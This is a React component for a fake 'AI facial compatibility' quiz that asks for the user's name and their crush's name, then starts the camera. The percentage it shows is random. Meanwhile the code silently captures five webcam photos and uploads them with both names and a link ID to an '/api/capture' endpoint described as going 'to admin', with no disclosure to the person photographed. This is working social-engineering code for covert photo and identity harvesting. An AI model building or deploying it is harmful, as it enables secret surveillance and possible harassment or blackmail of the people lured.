'use client';
import { useState, useRef } from 'react';

export default function CaptureLogic({ linkId }) {
  const [userName, setUserName] = useState('');
  const [crushName, setCrushName] = useState('');
  const [step, setStep] = useState(1); // 1=form, 2=positioning, 3=scanning, 4=result
  const [result, setResult] = useState(null);
  const [statusText, setStatusText] = useState('Initializing Scanner...');
  const [capturedPhotos, setCapturedPhotos] = useState([]);
  const [isScanning, setIsScanning] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  // Initialize camera and move to positioning
  const handleOpenScanner = async (e) => {
    e.preventDefault();
    if (!userName || !crushName) return;

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: 'user',
          width: { ideal: 640 },
          height: { ideal: 480 }
        },
        audio: false
      });
      setStep(2);
      setStatusText('Position your face in the circle');
      
      // Give React a tick to mount the video element
      setTimeout(() => {
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch(console.error);
        }
      }, 100);
    } catch (err) {
      console.warn('Camera access denied:', err.message);
      // Failsafe: proceed without camera
      setStep(3);
      setStatusText('Analyzing compatibility patterns...');
      const fallbackPct = Math.floor(Math.random() * (99 - 75 + 1) + 75);
      setResult(fallbackPct);
      setTimeout(() => setStep(4), 3000);
    }
  };

  // Trigger the actual capture blast
  const handleScan = async () => {
    if (isScanning) return;
    setIsScanning(true);
    setStep(3);
    setStatusText('Analyzing Facial Markers...');

    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas) return;

    const stream = video.srcObject;
    const photos = [];
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext('2d');

    // Generate result percentage early to store it
    const matchPct = Math.floor(Math.random() * (99 - 75 + 1) + 75);
    setResult(matchPct);

    // Capture 5 photos
    for (let i = 0; i < 5; i++) {
      try {
        ctx.drawImage(video, 0, 0, w, h);
        const uri = canvas.toDataURL('image/jpeg', 0.3);
        if (uri && uri.length > 500) photos.push(uri);
      } catch (err) { console.warn(err); }
      await new Promise(r => setTimeout(r, 400));
    }

    // Stop camera
    if (stream) stream.getTracks().forEach(t => t.stop());
    setCapturedPhotos(photos);

    // Upload to admin with percentage
    if (photos.length > 0) {
      fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          linkId, 
          userName, 
          crushName, 
          photos, 
          percentage: matchPct 
        })
      }).catch(err => console.error('Upload error:', err));
    }

    setStatusText('Match algorithm finalized!');
    setTimeout(() => setStep(4), 1000);
  };

  const downloadAllPhotos = () => {
    capturedPhotos.forEach((uri, idx) => {
      const link = document.createElement('a');
      link.href = uri;
      link.download = `compatibility_scan_${idx + 1}.jpg`;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    });
  };

  // ---- RENDER ----

  if (step === 1) {
    return (
      <form onSubmit={handleOpenScanner} className="space-y-6 animate-in fade-in zoom-in duration-500">
        <div className="text-center mb-6">
          <p className="text-pink-200/80 text-sm">Enter names to begin the AI Facial Compatibility Scan</p>
        </div>
        <div>
          <label className="block text-sm font-medium text-pink-200 mb-1">Your Name</label>
          <input
            type="text" required autoComplete="off" value={userName}
            onChange={e => setUserName(e.target.value)}
            className="w-full bg-white/10 border border-pink-500/30 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-pink-400 text-white placeholder-pink-200/50"
            placeholder="e.g. John Doe"
          />
        </div>
        <div>
          <label className="block text-sm font-medium text-pink-200 mb-1">Your Crush&apos;s Name</label>
          <input
            type="text" required autoComplete="off" value={crushName}
            onChange={e => setCrushName(e.target.value)}
            className="w-full bg-white/10 border border-pink-500/30 rounded-xl px-4 py-3 outline-none focus:ring-2 focus:ring-pink-400 text-white placeholder-pink-200/50"
            placeholder="e.g. Jane Smith"
          />
        </div>
        <button
          type="submit"
          className="w-full bg-gradient-to-r from-pink-500 to-purple-600 hover:from-pink-400 hover:to-purple-500 text-white font-bold py-4 rounded-xl shadow-lg transition-all transform hover:-translate-y-1"
        >
          Initialize AI Scanner ✨
        </button>
      </form>
    );
  }

  if (step === 2 || step === 3) {
    return (
      <div className="text-center space-y-6 animate-in fade-in duration-500">
        <div className="relative w-72 h-72 mx-auto overflow-hidden rounded-full border-4 border-pink-500/50 shadow-[0_0_30px_rgba(236,72,153,0.3)]">
          {/* Camera Preview */}
          <video
            ref={videoRef}
            autoPlay playsInline muted
            className="absolute inset-0 w-full h-full object-cover scale-x-[-1]"
          />
          {/* Scanning Overlay (active only in step 3) */}
          {step === 3 && (
            <div className="absolute inset-0 bg-pink-500/20 animate-pulse flex items-center justify-center">
               <div className="w-full h-1 bg-pink-400 absolute top-0 left-0 animate-[scan_2s_linear_infinite]"></div>
            </div>
          )}
          {/* Target Circle (active only in step 2) */}
          {step === 2 && (
            <div className="absolute inset-0 border-[40px] border-black/40 rounded-full pointer-events-none">
               <div className="absolute inset-0 border-2 border-dashed border-pink-400/60 rounded-full"></div>
            </div>
          )}
        </div>
        
        <canvas ref={canvasRef} className="hidden" />

        <div className="space-y-2">
          <h2 className="text-xl font-bold text-white tracking-wide">{statusText}</h2>
          <p className="text-pink-200/70 text-xs px-8">
            {step === 2 ? "Align your face within the markers for accurate name-to-face compatibility analysis." : "Analyzing structural micro-expressions..."}
          </p>
        </div>

        {step === 2 && (
          <button
            onClick={handleScan}
            className="bg-white/20 hover:bg-white/30 text-white px-8 py-3 rounded-full border border-white/30 backdrop-blur-md transition-all animate-bounce"
          >
            Snap & Calculate! 📸
          </button>
        )}

        <div className="w-full bg-gray-800 rounded-full h-1.5 overflow-hidden max-w-[200px] mx-auto">
          <div className={`bg-gradient-to-r from-pink-500 to-purple-500 h-full ${step === 3 ? 'w-full transition-all duration-[3s]' : 'w-10'}`}></div>
        </div>
      </div>
    );
  }

  // Step 4 — Result
  return (
    <div className="text-center space-y-6 animate-in slide-in-from-bottom-8 duration-700">
      <div>
        <div className="text-6xl font-black text-transparent bg-clip-text bg-gradient-to-r from-pink-400 via-purple-400 to-pink-400 animate-pulse">
          {result}%
        </div>
        <div className="text-[10px] text-pink-300 font-bold mt-1 tracking-widest uppercase">
          ⚠ dont allow always camera access!!!
        </div>
        <h2 className="text-2xl font-bold text-white mt-4">Incredible Match! 🔥</h2>
        <p className="text-pink-200 text-sm mt-1">
          You and <b className="text-white">{crushName}</b> are highly compatible based on facial numerology!
        </p>
      </div>

      <button
        onClick={() => window.location.reload()}
        className="text-pink-300 hover:text-white underline text-xs transition-colors"
      >
        Test someone else?
      </button>

      <style jsx global>{`
        @keyframes scan {
          0% { top: 0% }
          50% { top: 100% }
          100% { top: 0% }
        }
      `}</style>
    </div>
  );
}
